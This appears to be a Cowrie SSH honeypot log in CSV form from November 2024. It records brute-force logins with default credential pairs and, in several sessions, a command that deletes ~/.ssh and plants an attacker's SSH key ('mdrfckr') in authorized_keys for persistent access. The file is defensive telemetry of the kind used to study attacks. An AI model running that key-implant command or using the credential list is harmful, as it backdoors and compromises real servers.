eventid,src_ip,src_port,dst_ip,dst_port,session,protocol,version,hassh,hasshAlgorithms,message,sensor,timestamp
cowrie.client.kex,172.188.59.232,,,,9cc4748dba78,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T06:15:24.954720Z
cowrie.login.failed,172.188.59.232,,,,9cc4748dba78,,,,,login attempt [git/123456] failed,localhost,2024-11-24T06:15:25.720911Z
cowrie.login.success,115.186.131.194,,,,f22caaaef5e8,,,,,login attempt [root/1Qaz2Wsx] succeeded,localhost,2024-11-24T06:15:25.980969Z
cowrie.session.params,115.186.131.194,,,,f22caaaef5e8,,,,,[],localhost,2024-11-24T06:15:26.589796Z
cowrie.command.input,115.186.131.194,,,,f22caaaef5e8,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-11-24T06:15:26.590163Z
cowrie.command.failed,115.186.131.194,,,,f22caaaef5e8,,,,,Command not found: lockr -ia .ssh,localhost,2024-11-24T06:15:26.590786Z
cowrie.session.closed,172.188.59.232,,,,9cc4748dba78,,,,,Connection lost after 2 seconds,localhost,2024-11-24T06:15:26.903539Z
cowrie.log.closed,115.186.131.194,,,,f22caaaef5e8,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-11-24T06:15:27.222428Z
cowrie.session.params,115.186.131.194,,,,f22caaaef5e8,,,,,[],localhost,2024-11-24T06:15:27.538078Z
cowrie.command.input,115.186.131.194,,,,f22caaaef5e8,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-11-24T06:15:27.538433Z
cowrie.session.file_download,115.186.131.194,,,,f22caaaef5e8,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-11-24T06:15:27.835762Z
cowrie.log.closed,115.186.131.194,,,,f22caaaef5e8,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-11-24T06:15:27.836280Z
cowrie.session.connect,115.186.131.194,35688,172.233.154.19,2222,4c623ab21965,ssh,,,,New connection: 115.186.131.194:35688 (172.233.154.19:2222) [session: 4c623ab21965],localhost,2024-11-24T06:15:28.118223Z
cowrie.client.version,115.186.131.194,,,,4c623ab21965,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T06:15:28.118910Z
cowrie.client.kex,115.186.131.194,,,,4c623ab21965,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T06:15:28.411462Z
cowrie.login.failed,115.186.131.194,,,,4c623ab21965,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-11-24T06:15:29.623608Z
cowrie.session.closed,115.186.131.194,,,,4c623ab21965,,,,,Connection lost after 2 seconds,localhost,2024-11-24T06:15:30.918841Z
cowrie.session.connect,115.186.131.194,35696,172.233.154.19,2222,8d25441877f7,ssh,,,,New connection: 115.186.131.194:35696 (172.233.154.19:2222) [session: 8d25441877f7],localhost,2024-11-24T06:15:31.224022Z
cowrie.client.version,115.186.131.194,,,,8d25441877f7,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T06:15:31.224609Z
cowrie.client.kex,115.186.131.194,,,,8d25441877f7,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T06:15:31.522679Z
cowrie.login.success,115.186.131.194,,,,8d25441877f7,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-11-24T06:15:32.753663Z
cowrie.session.closed,115.186.131.194,,,,8d25441877f7,,,,,Connection lost after 1 seconds,localhost,2024-11-24T06:15:33.051942Z
cowrie.session.closed,115.186.131.194,,,,f22caaaef5e8,,,,,Connection lost after 8 seconds,localhost,2024-11-24T06:15:33.053699Z
cowrie.session.connect,93.123.85.205,54638,172.233.154.19,2222,06055605798d,ssh,,,,New connection: 93.123.85.205:54638 (172.233.154.19:2222) [session: 06055605798d],localhost,2024-11-24T06:15:35.505963Z
cowrie.client.version,93.123.85.205,,,,06055605798d,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T06:15:35.528043Z
cowrie.client.kex,93.123.85.205,,,,06055605798d,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T06:15:35.724257Z
cowrie.login.failed,93.123.85.205,,,,06055605798d,,,,,login attempt [test/Qwerty12345] failed,localhost,2024-11-24T06:15:36.608746Z
cowrie.session.closed,93.123.85.205,,,,06055605798d,,,,,Connection lost after 2 seconds,localhost,2024-11-24T06:15:37.909176Z
cowrie.session.connect,139.59.11.84,55086,172.233.154.19,2222,32c192877bd2,ssh,,,,New connection: 139.59.11.84:55086 (172.233.154.19:2222) [session: 32c192877bd2],localhost,2024-11-24T06:16:19.623349Z
cowrie.client.version,139.59.11.84,,,,32c192877bd2,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T06:16:19.623949Z
cowrie.client.kex,139.59.11.84,,,,32c192877bd2,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T06:16:19.830968Z
cowrie.login.failed,139.59.11.84,,,,32c192877bd2,,,,,login attempt [ubuntu/secret] failed,localhost,2024-11-24T06:16:20.706643Z
cowrie.session.closed,139.59.11.84,,,,32c192877bd2,,,,,Connection lost after 2 seconds,localhost,2024-11-24T06:16:21.915884Z
cowrie.session.connect,172.188.59.232,39794,172.233.154.19,2222,609f659bae26,ssh,,,,New connection: 172.188.59.232:39794 (172.233.154.19:2222) [session: 609f659bae26],localhost,2024-11-24T06:16:59.582106Z
cowrie.client.version,172.188.59.232,,,,609f659bae26,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T06:16:59.582681Z
cowrie.client.kex,172.188.59.232,,,,609f659bae26,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T06:16:59.764069Z
cowrie.login.failed,172.188.59.232,,,,609f659bae26,,,,,login attempt [user13/user13] failed,localhost,2024-11-24T06:17:00.530715Z
cowrie.session.closed,172.188.59.232,,,,609f659bae26,,,,,Connection lost after 2 seconds,localhost,2024-11-24T06:17:01.714886Z
cowrie.session.connect,152.32.203.233,48678,172.233.154.19,2222,ef618970257e,ssh,,,,New connection: 152.32.203.233:48678 (172.233.154.19:2222) [session: ef618970257e],localhost,2024-11-24T06:17:02.480356Z
cowrie.client.version,152.32.203.233,,,,ef618970257e,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T06:17:02.480960Z
cowrie.client.kex,152.32.203.233,,,,ef618970257e,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T06:17:02.583991Z
cowrie.login.success,152.32.203.233,,,,ef618970257e,,,,,login attempt [root/passwordabc123] succeeded,localhost,2024-11-24T06:17:03.036336Z
cowrie.session.params,152.32.203.233,,,,ef618970257e,,,,,[],localhost,2024-11-24T06:17:03.295885Z
cowrie.command.input,152.32.203.233,,,,ef618970257e,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-11-24T06:17:03.296267Z
cowrie.command.failed,152.32.203.233,,,,ef618970257e,,,,,Command not found: lockr -ia .ssh,localhost,2024-11-24T06:17:03.297081Z
cowrie.log.closed,152.32.203.233,,,,ef618970257e,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-11-24T06:17:03.503274Z
cowrie.session.params,152.32.203.233,,,,ef618970257e,,,,,[],localhost,2024-11-24T06:17:03.625255Z
cowrie.command.input,152.32.203.233,,,,ef618970257e,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-11-24T06:17:03.625611Z
cowrie.session.file_download,152.32.203.233,,,,ef618970257e,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-11-24T06:17:03.729977Z
cowrie.log.closed,152.32.203.233,,,,ef618970257e,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-11-24T06:17:03.730469Z
cowrie.session.connect,152.32.203.233,50014,172.233.154.19,2222,fcc1bee04595,ssh,,,,New connection: 152.32.203.233:50014 (172.233.154.19:2222) [session: fcc1bee04595],localhost,2024-11-24T06:17:03.839646Z
cowrie.client.version,152.32.203.233,,,,fcc1bee04595,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T06:17:03.840249Z
cowrie.client.kex,152.32.203.233,,,,fcc1bee04595,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T06:17:03.949887Z
cowrie.login.failed,152.32.203.233,,,,fcc1bee04595,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-11-24T06:17:04.429329Z
cowrie.session.closed,152.32.203.233,,,,fcc1bee04595,,,,,Connection lost after 1 seconds,localhost,2024-11-24T06:17:05.541690Z
cowrie.session.connect,152.32.203.233,50016,172.233.154.19,2222,e0234809fc58,ssh,,,,New connection: 152.32.203.233:50016 (172.233.154.19:2222) [session: e0234809fc58],localhost,2024-11-24T06:17:05.652311Z
cowrie.client.version,152.32.203.233,,,,e0234809fc58,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T06:17:05.652920Z
cowrie.client.kex,152.32.203.233,,,,e0234809fc58,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T06:17:05.762760Z
cowrie.login.success,152.32.203.233,,,,e0234809fc58,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-11-24T06:17:06.244978Z
cowrie.session.closed,152.32.203.233,,,,ef618970257e,,,,,Connection lost after 3 seconds,localhost,2024-11-24T06:17:06.354200Z
cowrie.session.closed,152.32.203.233,,,,e0234809fc58,,,,,Connection lost after 0 seconds,localhost,2024-11-24T06:17:06.355957Z
cowrie.session.connect,115.186.131.194,33624,172.233.154.19,2222,e61b592cf787,ssh,,,,New connection: 115.186.131.194:33624 (172.233.154.19:2222) [session: e61b592cf787],localhost,2024-11-24T06:17:07.567281Z
cowrie.client.version,115.186.131.194,,,,e61b592cf787,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T06:17:07.567794Z
cowrie.client.kex,115.186.131.194,,,,e61b592cf787,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T06:17:07.853756Z
cowrie.login.success,115.186.131.194,,,,e61b592cf787,,,,,login attempt [root/P@55w0rd01!] succeeded,localhost,2024-11-24T06:17:09.037470Z
cowrie.session.params,115.186.131.194,,,,e61b592cf787,,,,,[],localhost,2024-11-24T06:17:09.628009Z
cowrie.command.input,115.186.131.194,,,,e61b592cf787,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-11-24T06:17:09.628353Z
cowrie.command.failed,115.186.131.194,,,,e61b592cf787,,,,,Command not found: lockr -ia .ssh,localhost,2024-11-24T06:17:09.629007Z
cowrie.log.closed,115.186.131.194,,,,e61b592cf787,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-11-24T06:17:10.242118Z
cowrie.session.params,115.186.131.194,,,,e61b592cf787,,,,,[],localhost,2024-11-24T06:17:10.546361Z
cowrie.command.input,115.186.131.194,,,,e61b592cf787,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-11-24T06:17:10.546705Z
cowrie.session.file_download,115.186.131.194,,,,e61b592cf787,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-11-24T06:17:10.833809Z
cowrie.log.closed,115.186.131.194,,,,e61b592cf787,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-11-24T06:17:10.834249Z
cowrie.session.connect,115.186.131.194,33626,172.233.154.19,2222,3552655936e8,ssh,,,,New connection: 115.186.131.194:33626 (172.233.154.19:2222) [session: 3552655936e8],localhost,2024-11-24T06:17:11.114161Z
cowrie.client.version,115.186.131.194,,,,3552655936e8,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T06:17:11.114575Z
cowrie.client.kex,115.186.131.194,,,,3552655936e8,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T06:17:11.397199Z
cowrie.login.failed,115.186.131.194,,,,3552655936e8,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-11-24T06:17:12.567899Z
cowrie.session.closed,115.186.131.194,,,,3552655936e8,,,,,Connection lost after 2 seconds,localhost,2024-11-24T06:17:13.852510Z
cowrie.session.connect,115.186.131.194,59182,172.233.154.19,2222,9443667483b4,ssh,,,,New connection: 115.186.131.194:59182 (172.233.154.19:2222) [session: 9443667483b4],localhost,2024-11-24T06:17:14.146958Z
cowrie.client.version,115.186.131.194,,,,9443667483b4,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T06:17:14.148110Z
cowrie.client.kex,115.186.131.194,,,,9443667483b4,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T06:17:14.438650Z
cowrie.login.success,115.186.131.194,,,,9443667483b4,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-11-24T06:17:15.603533Z
cowrie.session.closed,115.186.131.194,,,,e61b592cf787,,,,,Connection lost after 8 seconds,localhost,2024-11-24T06:17:15.893738Z
cowrie.session.closed,115.186.131.194,,,,9443667483b4,,,,,Connection lost after 1 seconds,localhost,2024-11-24T06:17:15.895426Z
cowrie.session.connect,139.59.11.84,51612,172.233.154.19,2222,3dcb4516bf55,ssh,,,,New connection: 139.59.11.84:51612 (172.233.154.19:2222) [session: 3dcb4516bf55],localhost,2024-11-24T06:17:47.914317Z
cowrie.client.version,139.59.11.84,,,,3dcb4516bf55,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T06:17:47.921708Z
cowrie.client.kex,139.59.11.84,,,,3dcb4516bf55,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T06:17:48.137717Z
